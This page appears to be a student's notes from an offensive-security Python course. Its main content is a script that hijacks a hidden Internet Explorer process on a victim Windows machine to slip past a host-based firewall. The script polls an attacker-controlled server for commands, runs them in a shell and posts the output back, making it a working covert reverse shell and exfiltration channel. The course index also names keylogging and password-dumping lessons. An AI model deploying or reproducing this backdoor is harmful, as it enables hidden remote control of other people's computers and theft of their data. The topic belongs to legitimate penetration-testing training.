---
title: Hickjack the Internet Explorer process to bypass an host-based firewall
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - python
  - python pentesting
  - scripting
  - reverse shell
  - bypassing techniques
  - host based firewall
---

# Hickjack the Internet Explorer process to bypass an host-based firewall

From course: [Python For Offensive PenTest: A Complete Practical Course](https://www.udemy.com/course/python-for-offensive-security-practical-course/).

??? abstract "General index of the course"
	- Gaining persistence shells (TCP + HTTP):
		- [Coding a TCP connection and a reverse shell](coding-a-tcp-reverse-shell.md).
		- [Coding a low level data exfiltration  - TCP connection](coding-a-low-level-data-exfiltration-tcp.md).
		- [Coding an http reverse shell](coding-an-http-reverse-shell.md).
		- [Coding a data exfiltration script for a http shell](coding-a-data-exfiltration-script-http-shell.md).
		- [Tunning the connection attempts](tunning-the-connection-attemps.md).
		- [Including cd command into TCP reverse shell](including-cd-command-into-tcp-reverse-shell.md).
	- Advanced scriptable shells:
		- [Using a Dynamic DNS instead of your bared attacker public ip](ddns-aware-shell.md).
		- [Making your binary persistent](making-your-binary-persistent.md). 
		- [Making a screenshot](making-a-screenshot.md). 
		- [Coding a reverse shell that searches files](coding-a-reverse-shell-that-searches-files.md). 
	- Techniques for bypassing filters: 
		- [Coding a reverse shell that scans ports](coding-a-reverse-shell-that-scans-ports.md). 
		- [Hickjack the Internet Explorer process to bypass an host-based firewall](hickjack-internet-explorer-process-to-bypass-an-host-based-firewall.md).
		- [Bypassing Next Generation Firewalls](bypassing-next-generation-firewalls.md).
		- [Bypassing IPS with handmade XOR Encryption](bypassing-ips-with-handmade-xor-encryption.md).
	- Malware and crytography:
		- [TCP reverse shell with AES encryption](tcp-reverse-shell-with-aes-encryption.md).
		- [TCP reverse shell with RSA encryption](tcp-reverse-shell-with-rsa-encryption.md).
		- [TCP reverse shell with hybrid encryption AES + RSA](tcp-reverse-shell-with-hybrid-encryption-rsa-aes.md).
	- Password Hickjacking:
		- [Simple keylogger in python](python-keylogger.md).
		- [Hijacking Keepass Password Manager](hijacking-keepass.md).
		- [Dumping saved passwords from Google Chrome](dumping-chrome-saved-passwords.md).
		- [Man in the browser attack](man-in-the-browser-attack.md).
		- [DNS Poisoning](dns-poisoning.md).
	- Privilege escalation:
		- [Weak service file permission](privilege-escalation.md).


For our script to bypass a host-based firewall (based on an ACL), we will hickjack the Internet Explorer process to conceal our traffick and bypass it.

## Client side

Make sure that the victim machine (a windows 10) has installed these two python libraries: pypiwin32 and pywin32.

To be run on our victim's machine.

```python
# Python For Offensive PenTest: A Complete Practical Course  - All rights reserved 
# Follow me on LinkedIn  https://jo.linkedin.com/in/python2

from win32com.client import Dispatch
from time import sleep
import subprocess

ie = Dispatch("InternetExplorer.Application") # Create browser instance.
ie.Visible = 0 # Make it invisible [ run in background ] (1= visible)

# Paramaeters for POST
dURL = "http://192.168.0.152"  
Flags = 0
TargetFrame = 0


while True:
    ie.Navigate("http://192.168.0.152") # Navigate to our kali web server (the attacker machine) to grab the hacker commands
    while ie.ReadyState != 4: # Wait for browser to finish loading.
        sleep(1)

    command = ie.Document.body.innerHTML 
    command = command.encode() # encode the command
    if 'terminate' in command.decode():
        ie.Quit() # quit the IE and end up the process
        break
    else:
        CMD = subprocess.Popen(command.decode(), shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
        Data = CMD.stdout.read()
        PostData = memoryview( Data ) # in order to submit or post data using COM technique , it requires to  buffer the data first using memoryview
        ie.Navigate(dURL, Flags, TargetFrame, PostData) # we post the comamnd execution result along with the post parameters which we defined eariler..

    sleep(3)

```